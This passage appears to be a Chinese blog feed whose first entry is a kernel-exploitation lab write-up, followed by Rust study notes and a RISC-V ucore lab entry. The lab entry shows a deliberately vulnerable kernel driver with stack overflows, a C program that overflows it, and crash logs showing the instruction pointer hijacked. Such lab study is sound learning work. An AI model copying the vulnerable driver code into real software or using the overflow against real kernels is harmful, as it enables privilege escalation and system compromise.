class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">module_cleanup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  cdev_del(&amp;c_dev);</span><br><span class="line">  unregister_chrdev_region(dev_id, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="open-read-write-close"><a href="#open-read-write-close" class="headerlink" title="open&amp;read&amp;write&amp;close"></a>open&amp;read&amp;write&amp;close</h2><blockquote>
<p>具体操作函数即是漏洞存在点，很容易发现溢出漏洞，但是利用还需学习</p>
<p>发现了栈溢出漏洞，但是open，close好像也有漏洞，因此需要深入学习</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *g_buf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_open called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!g_buf) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;kmalloc failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">module_read</span><span class="params">(<span class="keyword">struct</span> file *file,</span></span><br><span class="line"><span class="params">                        <span class="type">char</span> __user *buf, <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params">                        <span class="type">loff_t</span> *f_pos)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> kbuf[BUFFER_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_read called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(kbuf, g_buf, BUFFER_SIZE);</span><br><span class="line">  <span class="keyword">if</span> (_copy_to_user(buf, kbuf, count)) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;copy_to_user failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">module_write</span><span class="params">(<span class="keyword">struct</span> file *file,</span></span><br><span class="line"><span class="params">                            <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params">                            <span class="type">loff_t</span> *f_pos)</span>	</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> kbuf[BUFFER_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_write called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_copy_from_user(kbuf, buf, count)) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;copy_from_user failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(g_buf, kbuf, BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_close called\n&quot;</span>);</span><br><span class="line">  kfree(g_buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="编写脚本以及利用"><a href="#编写脚本以及利用" class="headerlink" title="编写脚本以及利用"></a>编写脚本以及利用</h2><blockquote>
<p>尝试栈溢出，观察到内核崩溃，程序退出</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fatal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;open(\&quot;/dev/holstein\&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x800</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x800</span>);</span><br><span class="line">  write(fd, buf, <span class="number">0x800</span>);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../../themes/butterfly/source/img/mypic/kernelpwn/%E6%A0%88%E6%BA%A2%E5%87%BA.png" alt="image-20240829161338051"></p>
<blockquote>
<p>主要崩溃原因为：溢出到了保护页，尝试减少溢出</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BUG: <span class="built_in">stack</span> guard page was hit <span class="title function_">at</span> <span class="params">(____ptrval____)</span> <span class="params">(<span class="built_in">stack</span> is (____ptrval____)..(____ptrval____))</span>                                                                                    kernel <span class="built_in">stack</span> <span class="title function_">overflow</span> <span class="params">(page fault)</span>: 0000 [#1] PREEMPT SMP NOPTI    </span><br><span class="line">可惜没有改变RIP的取值</span><br></pre></td></tr></table></figure>

<blockquote>
<p>减少溢出到0x420，可以看到rip被劫持</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/ # ./exploit</span><br><span class="line">general protection fault: <span class="number">0000</span> [#<span class="number">1</span>] PREEMPT SMP NOPTI</span><br><span class="line">CPU: <span class="number">0</span> PID: <span class="number">163</span> Comm: exploit Tainted: G           O      <span class="number">5.10</span><span class="number">.7</span> #<span class="number">1</span></span><br><span class="line">Hardware name: QEMU Standard <span class="title function_">PC</span> <span class="params">(i440FX + PIIX, <span class="number">1996</span>)</span>, BIOS 1.15.0-1 04/01/2014</span><br><span class="line">RIP: 0010:0x4141414141414141</span><br><span class="line">Code: Unable to access opcode bytes at RIP 0x4141414141414117.</span><br><span class="line">RSP: 0018:ffffc90000443eb8 EFLAGS: 00000202</span><br><span class="line">RAX: 0000000000000420 RBX: ffff888003141900 RCX: 0000000000000000</span><br><span class="line">RDX: 000000000000007f RSI: ffffc90000443ea8 RDI: ffff8880032a9400</span><br><span class="line">RBP: 4141414141414141 R08: ffffffff81ea4608 R09: 0000000000004ffb</span><br><span class="line">R10: 00000000fffff000 R11: 3fffffffffffffff R12: 0000000000000420</span><br><span class="line">R13: 0000000000000000 R14: 00007ffee0caf4e0 R15: ffffc90000443ef8</span><br><span class="line">FS:  00000000004<span class="title function_">cd3c0</span><span class="params">(<span class="number">0000</span>)</span> GS:<span class="title function_">ffff888003800000</span><span class="params">(<span class="number">0000</span>)</span> knlGS:0000000000000000</span><br><span class="line">CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">CR2: 00000000004b4b60 CR3: 00000000032aa000 CR4: 00000000000006f0</span><br><span class="line">Call Trace:</span><br><span class="line"> ? ksys_write+0x53/0xd0</span><br><span class="line"> ? __x64_sys_write+0x15/0x20</span><br><span class="line"> ? do_syscall_64+0x38/0x50</span><br><span class="line"> ? entry_SYSCALL_64_after_hwframe+0x44/0xa9</span><br><span class="line">Modules linked in: <span class="title function_">vuln</span><span class="params">(O)</span></span><br><span class="line">---[ end trace 61f5f4af6b064506 ]---</span><br><span class="line">RIP: 0010:0x4141414141414141</span><br><span class="line">Code: Unable to access opcode bytes at RIP 0x4141414141414117.</span><br><span class="line">RSP: 0018:ffffc90000443eb8 EFLAGS: 00000202</span><br><span class="line">RAX: 0000000000000420 RBX: ffff888003141900 RCX: 0000000000000000</span><br><span class="line">RDX: 000000000000007f RSI: ffffc90000443ea8 RDI: ffff8880032a9400</span><br><span class="line">RBP: 4141414141414141 R08: ffffffff81ea4608 R09: 0000000000004ffb</span><br><span class="line">R10: 00000000fffff000 R11: 3fffffffffffffff R12: 0000000000000420</span><br><span class="line">R13: 0000000000000000 R14: 00007ffee0caf4e0 R15: ffffc90000443ef8</span><br><span class="line">FS:  00000000004<span class="title function_">cd3c0</span><span class="params">(<span class="number">0000</span>)</span> GS:<span class="title function_">ffff888003800000</span><span class="params">(<span class="number">0000</span>)</span> knlGS:0000000000000000</span><br><span class="line">CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">CR2: 00000000004b4b60 CR3: 00000000032aa000 CR4: 00000000000006f0</span><br><span class="line">Kernel panic - not syncing: Fatal exception</span><br><span class="line">Kernel Offset: disabled</span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>kernelpwn</category>
      </categories>
      <tags>
        <tag>kernelpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>rust初探</title>
    <url>/2024/09/15/rust/rust%E4%B9%8Btrait/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>trait特性是rust中比较重要的，类似于c++中的虚函数特性，但是从对象为主导，变成了以函数为主导，第一感觉rust像是面向函数式编程。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><blockquote>
<p>可以先定义trait定义一组方法，然后绑定给不同的数据结构，然后可以根据数据结构的不同访问不同的方法,也有c++中类似于动态绑定的概念，但是要比继承简单很多。</p>
</blockquote>
<p>示例：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">trait</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">f64</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Circle</span> &#123;</span><br><span class="line">    radius: <span class="type">f64</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Square</span> &#123;</span><br><span class="line">    side: <span class="type">f64</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Shape</span> <span class="keyword">for</span> <span class="title class_">Circle</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">f64</span> &#123;</span><br><span class="line">        <span class="number">3.14</span> * <span class="keyword">self</span>.radius * <span class="keyword">self</span>.radius</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Shape</span> <span class="keyword">for</span> <span class="title class_">Square</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">f64</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.side * <span class="keyword">self</span>.side</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">print_area</span>(shape: &amp;<span class="keyword">dyn</span> Shape) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Area: &#123;&#125;&quot;</span>, shape.<span class="title function_ invoke__">area</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">circle</span> = Circle &#123; radius: <span class="number">5.0</span> &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">square</span> = Square &#123; side: <span class="number">3.0</span> &#125;;</span><br><span class="line">    <span class="title function_ invoke__">print_area</span>(&amp;circle);</span><br><span class="line">    <span class="title function_ invoke__">print_area</span>(&amp;square);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>rust</category>
      </categories>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title>rust初探</title>
    <url>/2024/09/15/rust/rust/</url>
    <content><![CDATA[<p>从现在开始进行rust语言的学习。</p>
<h2 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1.基础概念"></a>1.基础概念</h2><blockquote>
<p>此部分比较简单，基本上是每个语言都有的概念</p>
<p>c语言的差异：1.静态类型  2.没有隐式类型转换。</p>
</blockquote>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><blockquote>
<p>主要分为标量以及复合类型，具体可参考<a href="https://kaisery.github.io/trpl-zh-cn/ch03-02-data-types.html">https://kaisery.github.io/trpl-zh-cn/ch03-02-data-types.html</a></p>
<p>标量：整型、浮点型、布尔类型和字符类型。</p>
<p>复合类型：Rust 有两个原生的复合类型：元组（tuple）和数组（array）。</p>
</blockquote>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><blockquote>
<p>要搞清楚可变变量和不可变变量（默认），以及常量（c语言是运行时检查的，加上const关键字）</p>
<p>也要搞清楚什么是变量遮掩。（<strong>Shadowing</strong>）可以和作用域以及别名来联想对比学习。</p>
</blockquote>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><blockquote>
<p>和一般的函数没什么不同，无非就是返回值，名称以及参数，函数的最后一个表达式的值默认为返回值（下面会讲解表达式）</p>
</blockquote>
<h3 id="语句以及表达式"><a href="#语句以及表达式" class="headerlink" title="语句以及表达式"></a>语句以及表达式</h3><blockquote>
<p><strong>语句</strong>（<em>Statements</em>）是执行一些操作但不返回值的指令。 <strong>表达式</strong>（<em>Expressions</em>）计算并产生一个值.</p>
<p>{}是比较常见的表达式。</p>
</blockquote>
<h3 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h3><blockquote>
<p>无非就是改变程序的原本的执行流程的一些功能，是一种特殊的表达式。</p>
<h3 id="关于if：在-Rust-中，if-表达式的返回值是它执行的分支中最后一个表达式的值，不同分支必须返回相同类型。并且条件-必须-是-bool-值"><a href="#关于if：在-Rust-中，if-表达式的返回值是它执行的分支中最后一个表达式的值，不同分支必须返回相同类型。并且条件-必须-是-bool-值" class="headerlink" title="关于if：在 Rust 中，if 表达式的返回值是它执行的分支中最后一个表达式的值，不同分支必须返回相同类型。并且条件 必须 是 bool 值"></a>关于if：在 Rust 中，<code>if</code> 表达式的返回值是它执行的分支中最后一个表达式的值，不同分支必须返回相同类型。并且条件 <strong>必须</strong> 是 <code>bool</code> 值</h3><h3 id="关于循环：Rust-有三种循环：loop、while-和-for只有loop是表达式可以返回值-且loop可以跳出嵌套循环。"><a href="#关于循环：Rust-有三种循环：loop、while-和-for只有loop是表达式可以返回值-且loop可以跳出嵌套循环。" class="headerlink" title="关于循环：Rust 有三种循环：loop、while 和 for只有loop是表达式可以返回值,且loop可以跳出嵌套循环。"></a>关于循环：Rust 有三种循环：<code>loop</code>、<code>while</code> 和 <code>for</code>只有loop是表达式可以返回值,且loop可以跳出嵌套循环。</h3><h3 id="for和while：for基本上和可迭代对象搭配在一起使用，而while的用法和if差不多。"><a href="#for和while：for基本上和可迭代对象搭配在一起使用，而while的用法和if差不多。" class="headerlink" title="for和while：for基本上和可迭代对象搭配在一起使用，而while的用法和if差不多。"></a>for和while：for基本上和可迭代对象搭配在一起使用，而while的用法和if差不多。</h3></blockquote>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">count</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="symbol">&#x27;counting_up</span>: <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;count = &#123;count&#125;&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">remaining</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">loop</span> &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;remaining = &#123;remaining&#125;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> remaining == <span class="number">9</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> count == <span class="number">2</span> &#123;</span><br><span class="line">                <span class="keyword">break</span> <span class="symbol">&#x27;counting_up</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            remaining -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;End count = &#123;count&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-所有权"><a href="#2-所有权" class="headerlink" title="2.所有权"></a>2.所有权</h2><blockquote>
<p>这一部分讲解的是关于rust的自动垃圾回收的一些原理</p>
<p><strong>important rule：</strong></p>
<ol>
<li><strong>Rust 中的每一个值都有一个 所有者（<em>owner</em>）。</strong></li>
<li><strong>值在任一时刻有且只有一个所有者。</strong></li>
<li><strong>当所有者（变量）离开作用域，这个值将被丢弃。</strong></li>
</ol>
<p>这个垃圾回收主要是针对分配在堆上的复杂数据类型而基本数据类型分配在栈上是不需要GC的功能的。</p>
<p>以下的代码片段可以说明上述观点：</p>
</blockquote>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>); <span class="comment">// 从此处起，s 是有效的</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 s</span></span><br><span class="line">&#125;                                  <span class="comment">// 此作用域已结束，</span></span><br><span class="line">                                   <span class="comment">// s 不再有效</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>理解这部分内容需要知道变量和数据的交互方式，基本分为以下三种：</p>
<p>1.移动：也就是说每一个变量的所在地址都拥有一个值的副本，基本数据类型没有问题，但是涉及到类似string类型（在堆中分配），那就有问题了，都知道引用堆中数据是靠指针，那么两个地址分配同一个指针那么在释放的时候就会出现double free的错误，因此需要调整，这里貌似是直接使之前的变量失效（根据import rules）。</p>
<p>2.克隆：解决了string这种复杂类型的拷贝问题，但是需要调用clone函数而不是简单的赋值</p>
</blockquote>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*clone示例*/</span></span><br><span class="line">	<span class="keyword">let</span> <span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s2</span> = s1.<span class="title function_ invoke__">clone</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;s1 = &#123;s1&#125;, s2 = &#123;s2&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此部分探讨函数参数的传递问题</p>
<p>函数的传递类似于所有权的调整，因此当在函数调用前声明一个复杂类型的话，那么传递给函数参数的时候此变量就会失效，在函数返回时需要再抛出一个同种类型的变量给失效变量。非常繁琐，因此需要另一种解决方法。那么就需要了解引用。</p>
<p>引用的本质就是虽然无法将同一个堆区域分配给多个变量，但是可以将变量的地址来分配给另一个变量以此来实现多个变量控制一块堆区域，类似于c中的指针的指针，因此很好的解决的复杂类型的移动的问题。但也有要注意的地方：如下函数获得了一个已销毁的变量的引用，会出现大问题。</p>
<p>还有需要注意的一个点：一次只能存在一个可变引用。</p>
</blockquote>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">no_dangle</span>() <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &amp;s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可改为：</p>
</blockquote>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">no_dangle</span>() <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此部分探讨了slice类型，感觉就是部分字符串的引用，需要注意其是不可变的即可。</p>
</blockquote>
<h2 id="3-复合数据类型"><a href="#3-复合数据类型" class="headerlink" title="3.复合数据类型"></a>3.复合数据类型</h2><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><blockquote>
<p>没什么复杂的，就是有一个方法的概念，其他的和c语言的差不了多少。</p>
<p>直接看：<a href="https://kaisery.github.io/trpl-zh-cn/ch05-03-method-syntax.html%E4%B8%8D%E6%83%B3%E6%80%BB%E7%BB%93%E4%BA%86">https://kaisery.github.io/trpl-zh-cn/ch05-03-method-syntax.html不想总结了</a></p>
</blockquote>
<h3 id="枚举和模式匹配"><a href="#枚举和模式匹配" class="headerlink" title="枚举和模式匹配"></a><a href="https://kaisery.github.io/trpl-zh-cn/ch06-00-enums.html#%E6%9E%9A%E4%B8%BE%E5%92%8C%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D">枚举和模式匹配</a></h3><blockquote>
<p>感觉教程上讲的有点乱，无法知道其在二进制文件中的存储模式。网上查了一下，rust中的枚举类似于c语言的union这样就清晰多了。</p>
<p>模式匹配类似于switch，是个表达式，可以返回值</p>
<p>match的简介写法，if let</p>
</blockquote>
<h2 id="4-项目管理"><a href="#4-项目管理" class="headerlink" title="4.项目管理"></a>4.项目管理</h2><blockquote>
<p>从现在开始学习项目管理的一些知识。</p>
</blockquote>
<h3 id="crate"><a href="#crate" class="headerlink" title="crate"></a>crate</h3><blockquote>
<p>crate 是 Rust 在编译时最小的代码单位。crate 有两种形式：二进制项和库。</p>
</blockquote>
<h3 id="package"><a href="#package" class="headerlink" title="package"></a>package</h3><blockquote>
<p>为一个项目，包含多个crate，但是只有一个可以充当入口点为main.rs，同理库也有一个入口点为：lib.rs</p>
</blockquote>
<h3 id="modele"><a href="#modele" class="headerlink" title="modele"></a>modele</h3><blockquote>
<p>包中的一部分，为了实现声明与实现相分离</p>
</blockquote>
<p>总的来说main.rs就相当于c语言中的main.c，而lib.rs就相当于头文件，而其他的crate就相当于其他的.c文件。可以将定义定义在多个文件中，只要最后在lib.rs中写上声明即可，当然模块分散在整个项目中，编译器需要路径才能很好处理，而为了每次简写模块路径有一种use的使用方法。	</p>
]]></content>
      <categories>
        <category>rust</category>
      </categories>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/09/16/kernelpwn/%E5%A0%86%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>ucore实验1</title>
    <url>/2024/08/31/ucore%E5%AE%9E%E9%AA%8C/lab1/</url>
    <content><![CDATA[<blockquote>
<p>本篇文章开始记录一些ucore的学习例程，以nku的2024实验作业为例</p>
<p>myblog：<a href="https://moyingxing.github.io/">https://moyingxing.github.io/</a></p>
</blockquote>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.mobisys.cc/oslab/lab2023/_book/lab0.5/lab0.5_3_1_layout.html">OpenSBI,bin,ELF · GitBook (mobisys.cc)</a></p>
<p><a href="https://riscv.org/wp-content/uploads/2017/05/riscv-privileged-v1.10.pdf">https://riscv.org/wp-content/uploads/2017/05/riscv-privileged-v1.10.pdf</a></p>
<p><a href="https://tinylab.org/riscv-uefi-part1/">https://tinylab.org/riscv-uefi-part1/</a></p>
<p><a href="http://www.mobisys.cc/oslab/lab2023/_book/lab0.5/lab0.5_3_1_layout.html">OpenSBI,bin,ELF · GitBook (mobisys.cc)</a></p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>os：wsl ubuntu22.04</p>
<p>gcc（交叉编译器手动编译）：13.2.0</p>
<p>qemu：QEMU emulator version 6.2.0 (Debian 1:6.2+dfsg-2ubuntu6.22)</p>
<p>代码资源：<a href="http://www.mobisys.cc/oslab/index.html">OS Labs (mobisys.cc)</a></p>
<h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><blockquote>
<p>因为本实验是以riscv-64位基础架构开发的os，因此需要理解此架构提供的一些硬件资源（如寄存器等等）和一些资源管理模式（第一感觉类似于x86架构下的GDT,LDT,IDT之类），因为是os级别的开发，所以只涉及到特权架构。</p>
</blockquote>
<h3 id="RISC-V-特权软件栈"><a href="#RISC-V-特权软件栈" class="headerlink" title="RISC-V 特权软件栈"></a>RISC-V 特权软件栈</h3><blockquote>
<p>描述在 RISC-V 处理器上运行的特权模式下的软件架构、模式和组件。十分的接口化和模块化，这块感觉和amd64相比是比较规范的，amd64基本上没有这么的考虑接口这些个东西。</p>
</blockquote>
<p><img src="/img/mypic/ucore/riscv.png" alt="image-20240831162403318"></p>
<p>本图从总体上描述了riscv上运行的软件的运行模式，任意两层之间的交互全都是通过二进制接口进行的，如中间的图像，os的实现可以调用下一层提供的Supervisor二进制接口来进行实现（这大概能保证os的移植性吧不知道，没体会到过），而SEE则是二进制接口的执行环境，对于os来说这大概就是在装载os之前实现的吧。最后一幅图主要讲的是虚拟机的实现方式，不是本次实验的重点，主要理解中间这副图即可。</p>
<h3 id="特权等级"><a href="#特权等级" class="headerlink" title="特权等级"></a>特权等级</h3><blockquote>
<p>接触过内核的都知道，指令是有权限的，比如一个用户级别的指令可以影响os级别的mmu的映射方式，那么一些恶意软件只要控制了一个用户级别的程序则可以控制你的电脑，都没有LPE什么事了，这岂不是乱套了？</p>
</blockquote>
<p><img src="/img/mypic/ucore/%E6%9D%83%E9%99%90.png" alt="image-20240831163159340"></p>
<p>可以看出riscv的架构分别有三种安全模式，分别为U,S,M，安全模式相关的信息存储在CSR寄存器中，因此当cpu进行指令执行时，会先检查CSR寄存器来判断是否有权限来执行此指令。越权访问将导致异常，会陷入异常处理程序。若使用riscv架构，那么硬件方面必须实现M特权，而其他特权是可选的。不同的特权有着不同的指令集扩展，需要深入学习。</p>
<h2 id="关于qemu在装载os前做的准备"><a href="#关于qemu在装载os前做的准备" class="headerlink" title="关于qemu在装载os前做的准备"></a>关于qemu在装载os前做的准备</h2><blockquote>
<p>riscv架构下，os的装载基址在物理地址0x80000000（此时未启动mmu），在执行os代码前，会先进行一些硬件环境初始化工作，从上面的介绍可以看出来，下面将一一介绍和学习。</p>
</blockquote>
<p>BIOS，UEFI和U-BOOT此三类程序才是一个计算机启动时首先运行的，但是BIOS经过一些列的标准化等等发展成了UEFI，而U-BOOT主要是用于嵌入式系统，经过一些列的初始化装载操作会执行一个叫做bootloader的东西，这个是os的装载的核心部分。可以看出bootloader在运行之前也是做了一些准备的，具体是啥不用关系，对学os没什么阻碍。至于实验文档上说的<code>QEMU模拟的这款riscv处理器的复位地址是0x1000，而不是0x80000000</code>估计也是这个原因吧。而在riscv架构下的bootloader则是OpenSBI。</p>
<p>关于opensbi的源代码可以通过下述命令来获取<code>git clone https://gitee.com/tinylab/qemu-opensbi.git</code>，在其中找到firmware文件夹，可以通过连接控制脚本来找到程序的入口点为__start,代码比较长就复制一下前几部分：</p>
